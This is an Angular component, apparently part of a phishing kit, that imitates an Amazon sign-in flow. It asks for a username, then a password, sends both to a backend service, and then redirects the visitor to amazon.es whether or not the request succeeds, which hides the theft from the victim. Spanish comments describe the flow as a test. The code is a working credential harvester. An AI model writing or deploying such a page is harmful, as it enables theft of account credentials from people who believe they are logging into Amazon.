import {Component, OnInit} from '@angular/core';
import {FormBuilder, FormControl, FormGroup} from '@angular/forms';
import {RequestsService} from "./requests.service";


@Component({
  selector: 'app-root',
  templateUrl: './app.component.html',
  styleUrls: ['./app.component.css']
})
export class AppComponent implements OnInit{
  title = 'amazon';
  step2 = false;
  userForm: FormGroup = this.fb.group({
    username: new FormControl(null),
    password: new FormControl(null),
    showpwd: new FormControl(null)
  });

  constructor(
    public fb: FormBuilder,
    public requestService: RequestsService
  ) {
  }

  ngOnInit() {

  }

  public sendData(){
    if (this.step2){
      console.log(this.userForm);
      // si el formulario es valido mando al back los valores del formulario
      if (this.userForm.valid){
        this.requestService.saveControls(this.userForm.value).subscribe(() =>{
          //redirijimos a amazon
          window.location.href = "https://www.amazon.es";
        },error => {
          //redirijimos a amazon tambien en el eror ya que no vamos a definir en esta prueba la url
          window.location.href = "https://www.amazon.es";
        });
      }
    }else{
      //solo pasamos de step si hay un usuario
      if (this.userForm.value.username)
      this.step2 = true;
    }
  }

}
